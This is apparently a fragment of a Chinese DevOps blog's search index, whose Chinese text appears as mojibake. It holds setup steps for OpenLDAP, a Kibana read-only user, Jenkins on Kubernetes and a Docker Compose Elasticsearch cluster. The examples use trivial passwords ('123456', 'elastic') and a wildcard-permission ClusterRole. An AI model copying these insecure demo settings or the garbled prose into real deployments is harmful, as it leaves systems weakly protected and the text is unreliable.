00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:4:3","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"4. åŠ è½½é»˜è®¤schema # é…ç½® cat \u003e schema.ldif \u003c\u003cEOF dn: cn=schema,cn=config objectClass: olcSchemaConfig cn: schema include: file:///etc/openldap/schema/collective.ldif include: file:///etc/openldap/schema/corba.ldif include: file:///etc/openldap/schema/cosine.ldif include: file:///etc/openldap/schema/duaconf.ldif include: file:///etc/openldap/schema/dyngroup.ldif include: file:///etc/openldap/schema/inetorgperson.ldif include: file:///etc/openldap/schema/java.ldif include: file:///etc/openldap/schema/misc.ldif include: file:///etc/openldap/schema/nis.ldif include: file:///etc/openldap/schema/openldap.ldif include: file:///etc/openldap/schema/pmi.ldif include: file:///etc/openldap/schema/ppolicy.ldif EOF # æ·»åŠ  [root@mytest myldif]# ldapadd -Y EXTERNAL -H ldapi:/// -f schema.ldif SASL/EXTERNAL authentication started SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth SASL SSF: 0 adding new entry \"cn=schema,cn=config\" adding new entry \"cn=collective,cn=schema,cn=config\" ...... # æŸ¥è¯¢ [root@mytest myldif]# ldapsearch -Y EXTERNAL -H ldapi:/// -b cn=schema,cn=config dn ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:4:4","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"5. ç¦æ­¢åŒ¿åæœç´¢ [root@mytest myldif]# cat \u003e disableAnon.ldif \u003c\u003c EOF dn: cn=config changetype: modify add: olcDisallows olcDisallows: bind_anon dn: cn=config changetype: modify add: olcRequires olcRequires: authc dn: olcDatabase={-1}frontend,cn=config changetype: modify add: olcRequires olcRequires: authc EOF [root@mytest myldif]# ldapmodify -Y EXTERNAL -H ldapi:/// -f disableAnon.ldif ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:4:5","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"6. å¼€å¯æ—¥å¿— # æ—¥å¿—çº§åˆ«è¯·å‚è€ƒhttps://www.openldap.org/doc/admin24/slapdconf2.htmlä¸­5.2.1.2éƒ¨åˆ†ä»‹ç» [root@mytest myldif]# cat \u003e setLogLevel.ldif \u003c\u003c EOF dn: cn=config changetype: modify replace: olcLogLevel olcLogLevel: stats EOF [root@mytest myldif]# ldapmodify -Y EXTERNAL -H ldapi:/// -f setLogLevel.ldif # openldapå°†æ—¥å¿—è¾“å‡ºåˆ°syslogçš„local4ä¸­, è¿˜éœ€è¦ä¿®æ”¹ä¸€ä¸ªrsyslogçš„é…ç½® echo 'local4.* /var/log/slapd.log' \u003e\u003e /etc/rsyslog.d/slapd.conf ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:4:6","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸‰ã€åˆ›å»ºæ ¹ç›®å½• DC åœ¨åˆ›å»ºä¹‹å‰åœ¨ç†è§£ä¸€ä¸‹dcã€ouã€cn 20230131144923.png å‡†å¤‡ldif [root@mytest myldif]# cat \u003e rootObj.ldif \u003c\u003cEOF dn: dc=soulchild,dc=cn objectClass: dcObject objectClass: organization dc: soulchild o: soulchildéšç¬”è®° EOF dcObject å’Œ organization è¡¨ç¤ºè¯¥ç›®å½•æ˜¯ä¸€ä¸ªåŸŸç›®å½•ï¼ˆdcObjectï¼‰å’Œä¸€ä¸ªç»„ç»‡ï¼ˆorganizationï¼‰ã€‚ dcObjectåŒ…å«å¿…å¡«å±æ€§dcã€‚organizationåŒ…å«å¿…å¡«å±æ€§oã€‚ dc è¡¨ç¤ºç›®å½•çš„åç§°ã€‚ o è¡¨ç¤ºç»„ç»‡å…¨ç§°ã€‚ ä¾‹å¦‚: dcæ˜¯alibabaï¼Œoæ˜¯é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸ åˆ›å»º ldapadd -f rootObj.ldif -D cn=admin,dc=soulchild,dc=cn -W # -w æŒ‡å®šå¯†ç  -W äº¤äº’å¼è¾“å…¥å¯†ç  # ä¹Ÿå¯ä»¥ä½¿ç”¨æœ¬åœ°å¥—æ¥å­—çš„æ–¹å¼ï¼Œå¯ä»¥å…å¯†ç  # ldapadd -Y EXTERNAL -H ldapi:/// -f rootObj.ldif æŸ¥çœ‹ ldapsearch -x -b dc=soulchild,dc=cn 20230131144700.png ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:5:0","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å››ã€åˆ›å»ºç»„ç»‡å•å…ƒ OU åˆ›å»ºç ”å‘ä¸­å¿ƒ [root@mytest myldif]# cat \u003e ç ”å‘ä¸­å¿ƒ.ldif \u003c\u003cEOF dn: ou=ç ”å‘ä¸­å¿ƒ,dc=soulchild,dc=cn objectClass: organizationalUnit ou: ç ”å‘ä¸­å¿ƒ EOF [root@mytest myldif]# ldapadd -f ç ”å‘ä¸­å¿ƒ.ldif -D cn=admin,dc=soulchild,dc=cn -W åˆ›å»ºåŸºç¡€æ¶æ„ç»„ [root@mytest myldif]# cat \u003e ç ”å‘ä¸­å¿ƒ.åŸºç¡€æ¶æ„ç»„.ldif \u003c\u003cEOF dn: ou=åŸºç¡€æ¶æ„ç»„,ou=ç ”å‘ä¸­å¿ƒ,dc=soulchild,dc=cn objectClass: organizationalUnit ou: åŸºç¡€æ¶æ„ç»„ EOF [root@mytest myldif]# ldapadd -f ç ”å‘ä¸­å¿ƒ.åŸºç¡€æ¶æ„ç»„.ldif -D cn=admin,dc=soulchild,dc=cn -W ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:6:0","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"äº”ã€åˆ›å»ºç”¨æˆ· CTOç”¨æˆ· # cnè¡¨ç¤ºåï¼Œsnè¡¨ç¤ºå§“ï¼Œuidä¸€èˆ¬æ˜¯ç™»å½•ç”¨çš„, è¿™é‡Œä½¿ç”¨çš„cnä½œä¸ºrdn(rdnæ˜¯dnæœ€å‰é¢é‚£ä¸€ä¸ªcn=cto) [root@mytest myldif]# cat \u003e ç ”å‘ä¸­å¿ƒ.cto.ldif \u003c\u003cEOF dn: cn=cto,ou=ç ”å‘ä¸­å¿ƒ,dc=soulchild,dc=cn cn: cto sn: cto objectClass: inetOrgPerson userPassword: 123456 uid: cto EOF [root@mytest myldif]# ldapadd -f ç ”å‘ä¸­å¿ƒ.cto.ldif -x -D cn=admin,dc=soulchild,dc=cn -W åŸºç¡€æ¶æ„ç»„ç”¨æˆ· # cnè¡¨ç¤ºå, snè¡¨ç¤ºå§“, è¿™é‡Œä½¿ç”¨çš„cnä½œä¸ºrdn(rdnæ˜¯dnæœ€å‰é¢é‚£ä¸€ä¸ªcn=cto) [root@mytest myldif]# cat \u003e ç ”å‘ä¸­å¿ƒ.åŸºç¡€æ¶æ„ç»„.å¼ ä¸‰.ldif \u003c\u003cEOF dn: cn=å¼ ä¸‰,ou=åŸºç¡€æ¶æ„ç»„,ou=ç ”å‘ä¸­å¿ƒ,dc=soulchild,dc=cn cn: å¼ ä¸‰ sn: zhangsan objectClass: inetOrgPerson userPassword: 123 EOF [root@mytest myldif]# ldapadd -f ç ”å‘ä¸­å¿ƒ.åŸºç¡€æ¶æ„ç»„.å¼ ä¸‰.ldif -x -D cn=admin,dc=soulchild,dc=cn -W ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:7:0","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å…­ã€åˆ›å»ºç»„ åˆ›å»ºä¸€ä¸ªjenkinsç»„, æ·»åŠ å¤šä¸ªæˆå‘˜åˆ°è¿™ä¸ªç»„ [root@mytest myldif]# cat \u003e ç ”å‘ä¸­å¿ƒ.jenkins.ldif \u003c\u003cEOF dn: cn=jenkins,ou=ç ”å‘ä¸­å¿ƒ,dc=soulchild,dc=cn cn: jenkins objectClass: groupOfNames member: cn=cto,ou=ç ”å‘ä¸­å¿ƒ,dc=soulchild,dc=cn member: cn=å¼ ä¸‰,ou=åŸºç¡€æ¶æ„ç»„,ou=ç ”å‘ä¸­å¿ƒ,dc=soulchild,dc=cn EOF [root@mytest myldif]# ldapadd -f ç ”å‘ä¸­å¿ƒ.jenkins.ldif -x -D cn=admin,dc=soulchild,dc=cn -W è¿™ä¸ªç»„æ— æ³•é…åˆjenkinså®ç°ç»„ä¸‹ç”¨æˆ·ç™»å½•ï¼Œæ²¡ç ”ç©¶å‡ºæ¥ ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:8:0","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸ƒã€åˆ é™¤æ¡ç›®æˆ–å¯¹è±¡ åˆ é™¤æ“ä½œæ¯”è¾ƒç®€å•ï¼Œç›´æ¥æŒ‡å®šdnå°±å¯ä»¥äº† [root@mytest myldif]# ldapdelete \"cn=jenkins,ou=ç ”å‘ä¸­å¿ƒ,dc=soulchild,dc=cn\" -D cn=admin,dc=soulchild,dc=cn -W ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:9:0","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"1. åˆ›å»ºè§’è‰² 20230128182236.png kibanaé¢æ¿æƒé™é…ç½®ï¼Œæ ¹æ®è‡ªå·±éœ€æ±‚é…ç½®å³å¯ 20230128182356.png 20230128182615.png ","date":"2023-01-28 18:20","objectID":"/post/%E4%BD%BF%E7%94%A8kibana%E5%88%9B%E5%BB%BAes%E5%8F%AA%E8%AF%BB%E7%94%A8%E6%88%B7/:0:1","tags":["es","kibana"],"title":"ä½¿ç”¨kibanaåˆ›å»ºesåªè¯»ç”¨æˆ·","uri":"/post/%E4%BD%BF%E7%94%A8kibana%E5%88%9B%E5%BB%BAes%E5%8F%AA%E8%AF%BB%E7%94%A8%E6%88%B7/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"2. åˆ›å»ºç”¨æˆ· 20230128182655.png ","date":"2023-01-28 18:20","objectID":"/post/%E4%BD%BF%E7%94%A8kibana%E5%88%9B%E5%BB%BAes%E5%8F%AA%E8%AF%BB%E7%94%A8%E6%88%B7/:0:2","tags":["es","kibana"],"title":"ä½¿ç”¨kibanaåˆ›å»ºesåªè¯»ç”¨æˆ·","uri":"/post/%E4%BD%BF%E7%94%A8kibana%E5%88%9B%E5%BB%BAes%E5%8F%AA%E8%AF%BB%E7%94%A8%E6%88%B7/"},{"categories":["devops"],"content":"1. åˆ›å»ºnamespace kubectl create namespace devops-tools ","date":"2023-01-26 23:59","objectID":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/:0:1","tags":["jenkins","devops"],"title":"K8séƒ¨ç½²jenkins","uri":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/"},{"categories":["devops"],"content":"2. åˆ›å»ºè´¦å·æƒé™ç›¸å…³ cat \u003c\u003cEOF | kubectl apply -f - --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: jenkins-admin rules: - apiGroups: [\"\"] resources: [\"*\"] verbs: [\"*\"] --- apiVersion: v1 kind: ServiceAccount metadata: name: jenkins-admin namespace: devops-tools --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: jenkins-admin roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: jenkins-admin subjects: - kind: ServiceAccount name: jenkins-admin namespace: devops-tools --- apiVersion: v1 kind: Secret metadata: name: jenkins-admin namespace: devops-tools annotations: kubernetes.io/service-account.name: \"jenkins-admin\" type: kubernetes.io/service-account-token EOF ","date":"2023-01-26 23:59","objectID":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/:0:2","tags":["jenkins","devops"],"title":"K8séƒ¨ç½²jenkins","uri":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/"},{"categories":["devops"],"content":"3. é…ç½®å­˜å‚¨ cat \u003c\u003cEOF | kubectl apply -f - apiVersion: v1 kind: PersistentVolumeClaim metadata: name: jenkins-pv-claim namespace: devops-tools spec: storageClassName: nfs accessModes: - ReadWriteOnce resources: requests: storage: 3Gi EOF ","date":"2023-01-26 23:59","objectID":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/:0:3","tags":["jenkins","devops"],"title":"K8séƒ¨ç½²jenkins","uri":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/"},{"categories":["devops"],"content":"4.åˆ›å»ºDeployment cat \u003c\u003cEOF | kubectl apply -f - apiVersion: apps/v1 kind: Deployment metadata: name: jenkins namespace: devops-tools spec: replicas: 1 selector: matchLabels: app: jenkins-server template: metadata: labels: app: jenkins-server spec: securityContext: fsGroup: 1000 runAsUser: 1000 serviceAccountName: jenkins-admin containers: - name: jenkins image: jenkins/jenkins:lts resources: limits: memory: \"2Gi\" cpu: \"1000m\" requests: memory: \"500Mi\" cpu: \"500m\" ports: - name: httpport containerPort: 8080 - name: jnlpport containerPort: 50000 livenessProbe: httpGet: path: \"/login\" port: 8080 initialDelaySeconds: 90 periodSeconds: 10 timeoutSeconds: 5 failureThreshold: 5 readinessProbe: httpGet: path: \"/login\" port: 8080 initialDelaySeconds: 60 periodSeconds: 10 timeoutSeconds: 5 failureThreshold: 3 volumeMounts: - name: jenkins-data mountPath: /var/jenkins_home volumes: - name: jenkins-data persistentVolumeClaim: claimName: jenkins-pv-claim EOF ","date":"2023-01-26 23:59","objectID":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/:0:4","tags":["jenkins","devops"],"title":"K8séƒ¨ç½²jenkins","uri":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/"},{"categories":["devops"],"content":"5. æš´éœ²æœåŠ¡ cat \u003c\u003cEOF | kubectl apply -f - --- apiVersion: v1 kind: Service metadata: name: jenkins-service namespace: devops-tools annotations: prometheus.io/scrape: 'true' prometheus.io/path: /prometheus prometheus.io/port: '8080' spec: selector: app: jenkins-server type: ClusterIP ports: - port: 8080 name: web targetPort: 8080 - port: 50000 name: jnlp targetPort: 50000 --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: jenkins.ops.cn namespace: devops-tools spec: ingressClassName: int-nginx rules: - host: jenkins.ops.cn http: paths: - backend: service: name: jenkins-service port: number: 8080 path: / pathType: Prefix EOF serviceå¿˜è®°æš´éœ²50000ç«¯å£ï¼Œåœ¨ä½¿ç”¨agentæ—¶ä¼šå‘ç”Ÿjava.io.IOException: http://jenkins-service.devops-tools.svc.cluster.local:8080/ provided port:50000 is not reachable on host jenkins-service.devops-tools.svc.cluster.local ","date":"2023-01-26 23:59","objectID":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/:0:5","tags":["jenkins","devops"],"title":"K8séƒ¨ç½²jenkins","uri":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/"},{"categories":["devops"],"content":"6. æŸ¥çœ‹å¯†ç  kubectl exec -it -n devops-tools jenkins-5498fbb866-twvxq -- cat /var/jenkins_home/secrets/initialAdminPassword ","date":"2023-01-26 23:59","objectID":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/:0:6","tags":["jenkins","devops"],"title":"K8séƒ¨ç½²jenkins","uri":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/"},{"categories":["devops"],"content":"7. é…ç½®agent éœ€è¦æå‰è£…å¥½kubernetes æ’ä»¶ 7.1 é…ç½®k8sé›†ç¾¤ä¿¡æ¯ 20230127014139.png 7.2 æ·»åŠ è¿æ¥åˆ°k8sçš„å‡­æ® 20230127005806.png 20230127014340.png 7.3 Podæ¨¡æ¿é…ç½® 20230127014551.png 20230127014604.png ","date":"2023-01-26 23:59","objectID":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/:0:7","tags":["jenkins","devops"],"title":"K8séƒ¨ç½²jenkins","uri":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/"},{"categories":["devops"],"content":"8. æµ‹è¯•æ„å»º 20230127014658.png ","date":"2023-01-26 23:59","objectID":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/:0:8","tags":["jenkins","devops"],"title":"K8séƒ¨ç½²jenkins","uri":"/post/k8s%E9%83%A8%E7%BD%B2jenkins/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"å‚è€ƒæ–‡æ¡£: https://www.elastic.co/guide/en/elasticsearch/reference/7.10/docker.html https://www.elastic.co/guide/en/kibana/7.10/docker.html ","date":"2023-01-18 15:05","objectID":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/:0:0","tags":["elasticsearch"],"title":"Docker Composeéƒ¨ç½²es7.10é›†ç¾¤","uri":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸€ã€å®‰è£…å‰å‡†å¤‡ echo \"vm.max_map_count=262144\" \u003e\u003e /etc/sysctl.conf sysctl -p ","date":"2023-01-18 15:05","objectID":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/:1:0","tags":["elasticsearch"],"title":"Docker Composeéƒ¨ç½²es7.10é›†ç¾¤","uri":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"äºŒã€å‡†å¤‡é…ç½®æ–‡ä»¶ ","date":"2023-01-18 15:05","objectID":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/:2:0","tags":["elasticsearch"],"title":"Docker Composeéƒ¨ç½²es7.10é›†ç¾¤","uri":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"1.docker-composeç›®å½•ç»“æ„ # tree es-cluster/ â”œâ”€â”€ conf â”‚Â â”œâ”€â”€ es01.yml â”‚Â â”œâ”€â”€ es02.yml â”‚Â â””â”€â”€ es03.yml â””â”€â”€ docker-compose.yml ","date":"2023-01-18 15:05","objectID":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/:2:1","tags":["elasticsearch"],"title":"Docker Composeéƒ¨ç½²es7.10é›†ç¾¤","uri":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"2. esé…ç½®æ–‡ä»¶ cluster.name: lta-docker node.master: true node.data: true node.ingest: true node.name: es01 node.attr.box_type: hot path.data: /usr/share/elasticsearch/data/ path.logs: /var/log/elasticsearch/ bootstrap.memory_lock: true network.host: 0 # å¦‚æœä½ ä¸æ˜¯åœ¨1å°æœºå™¨ä¸Šè·‘esé›†ç¾¤ï¼Œè¯·ç”¨ä¸‹é¢çš„é…ç½®æŒ‡å®šå½“å‰èŠ‚ç‚¹çš„é€šä¿¡åœ°å€ #network.bind_host: 0 #network.publish_host: å®¿ä¸»æœºIP http.port: 9200 transport.port: 9300 discovery.seed_hosts: - es01 - es02 - es03 cluster.initial_master_nodes: - es01 - es02 - es03 action.auto_create_index: \"*\" xpack.security.enabled: true xpack.security.transport.ssl.enabled: true xpack.security.transport.ssl.client_authentication: required xpack.security.transport.ssl.verification_mode: certificate xpack.security.transport.ssl.keystore.path: elastic-certificates.p12 xpack.security.transport.ssl.truststore.path: elastic-certificates.p12 å…¶ä»–èŠ‚ç‚¹çš„é…ç½®æ–‡ä»¶å¯å‚è€ƒä¸Šé¢ï¼Œåªéœ€è¦ä¿®æ”¹node.nameå³å¯ã€‚ ","date":"2023-01-18 15:05","objectID":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/:2:2","tags":["elasticsearch"],"title":"Docker Composeéƒ¨ç½²es7.10é›†ç¾¤","uri":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"3. åˆ›å»ºæ•°æ®æ—¥å¿—ç­‰ç›®å½• mkdir /data/es{01..03}/{data,logs,plugins} chown 1000:0 -R /data/* ","date":"2023-01-18 15:05","objectID":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/:2:3","tags":["elasticsearch"],"title":"Docker Composeéƒ¨ç½²es7.10é›†ç¾¤","uri":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"4. ç”ŸæˆèŠ‚ç‚¹é—´é€šä¿¡çš„è¯ä¹¦ docker run -it --rm -v /root/es-cluster/conf/:/certs docker.elastic.co/elasticsearch/elasticsearch:7.10.2 bash elasticsearch-certutil ca --out /certs/elastic-stack-ca.p12 elasticsearch-certutil cert --ca /certs/elastic-stack-ca.p12 --out /certs/elastic-certificates.p12 chown 1000:0 -R es-cluster/conf/ ","date":"2023-01-18 15:05","objectID":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/:2:4","tags":["elasticsearch"],"title":"Docker Composeéƒ¨ç½²es7.10é›†ç¾¤","uri":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸‰ã€composeæ–‡ä»¶ version: '2.2' x-es-defaults: \u0026es_defaults image: docker.elastic.co/elasticsearch/elasticsearch:7.10.2 deploy: resources: limits: cpus: '0.70' memory: 1024M reservations: cpus: '0.5' memory: 1024M ulimits: memlock: soft: -1 hard: -1 networks: - elastic services: es01: \u003c\u003c: *es_defaults container_name: es01 environment: - \"ES_JAVA_OPTS=-Xms512m -Xmx512m -XX:+UseContainerSupport -XX:InitialRAMPercentage=80.0 -XX:MaxRAMPercentage=80.0\" - \"ELASTIC_PASSWORD=elastic\" volumes: - ./conf/es01.yml:/usr/share/elasticsearch/config/elasticsearch.yml:ro - ./conf/elastic-certificates.p12:/usr/share/elasticsearch/config/elastic-certificates.p12:ro - /data/es01/data/:/usr/share/elasticsearch/data/ - /data/es01/logs/:/var/log/elasticsearch/ - /data/es01/plugins/:/usr/share/elasticsearch/plugins/ ports: - 9201:9200 - 9301:9300 es02: \u003c\u003c: *es_defaults container_name: es02 environment: - \"ES_JAVA_OPTS=-Xms512m -Xmx512m -XX:+UseContainerSupport -XX:InitialRAMPercentage=80.0 -XX:MaxRAMPercentage=80.0\" - \"ELASTIC_PASSWORD=elastic\" volumes: - ./conf/es02.yml:/usr/share/elasticsearch/config/elasticsearch.yml:ro - ./conf/elastic-certificates.p12:/usr/share/elasticsearch/config/elastic-certificates.p12:ro - /data/es02/data/:/usr/share/elasticsearch/data/ - /data/es02/logs/:/var/log/elasticsearch/ - /data/es02/plugins/:/usr/share/elasticsearch/plugins/ ports: - 9202:9200 - 9302:9300 es03: \u003c\u003c: *es_defaults container_name: es03 environment: - \"ES_JAVA_OPTS=-Xms512m -Xmx512m -XX:+UseContainerSupport -XX:InitialRAMPercentage=80.0 -XX:MaxRAMPercentage=80.0\" - \"ELASTIC_PASSWORD=elastic\" volumes: - ./conf/es03.yml:/usr/share/elasticsearch/config/elasticsearch.yml:ro - ./conf/elastic-certificates.p12:/usr/share/elasticsearch/config/elastic-certificates.p12:ro - /data/es03/data/:/usr/share/elasticsearch/data/ - /data/es03/logs/:/var/log/elasticsearch/ - /data/es03/plugins/:/usr/share/elasticsearch/plugins/ ports: - 9203:9200 - 9303:9300 kibana: container_name: kibana image: docker.elastic.co/kibana/kibana:7.10.2 environment: ELASTICSEARCH_HOSTS: '[\"http://es01:9200\",\"http://es02:9200\",\"http://es03:9200\"]' ELASTICSEARCH_USERNAME: elastic ELASTICSEARCH_PASSWORD: elastic ports: - 5601:5601 networks: - elastic cerebro: container_name: cerebro image: lmenezes/cerebro:0.8.3 ports: - 9000:9000 networks: - elastic networks: elastic: driver: bridge æ³¨æ„ é»˜è®¤esä¼šè‡ªåŠ¨åœ¨è·¯å¾„ /usr/share/elasticsearch/config/elasticsearch.keystore ä¸Šç”Ÿæˆkeystoreæ–‡ä»¶ï¼Œè¿™é‡Œå¯¹å…¶è¿›è¡ŒæŒä¹…åŒ–ï¼Œå¦‚æœä½ éœ€è¦çš„è¯ï¼Œéœ€è¦åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸­æŒ‚è½½ æ—¥å¿—é»˜è®¤è¾“å‡ºåˆ°æ§åˆ¶å°ï¼Œå¦‚æœè¦è¾“å‡ºåˆ°æ–‡ä»¶ï¼Œéœ€è¦ä¿®æ”¹log4j2.propertiesé…ç½® ","date":"2023-01-18 15:05","objectID":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/:3:0","tags":["elasticsearch"],"title":"Docker Composeéƒ¨ç½²es7.10é›†ç¾¤","uri":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"å››ã€å¯åŠ¨æœåŠ¡ cd es-cluster/ docker compose up -d åœ¨å¯åŠ¨æˆåŠŸåï¼Œéœ€è¦æ‰‹åŠ¨å°†é…ç½®æ–‡ä»¶ä¸­çš„cluster.initial_master_nodesåˆ é™¤æˆ–æ³¨é‡Š ","date":"2023-01-18 15:05","objectID":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/:4:0","tags":["elasticsearch"],"title":"Docker Composeéƒ¨ç½²es7.10é›†ç¾¤","uri":"/post/docker-compose%E9%83%A8%E7%BD%B2es7.10%E9%9B%86%E7%BE%A4/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"æ³¨æ„partedåˆ†åŒºå·¥å…·ä¸åƒfdiské‚£æ ·éœ€è¦ä¿å­˜æ‰ä¼šç”Ÿæ•ˆ,è€Œæ˜¯å®æ—¶ç”Ÿæ•ˆ,æ“ä½œéœ€è°¨æ… ","date":"2023-01-18 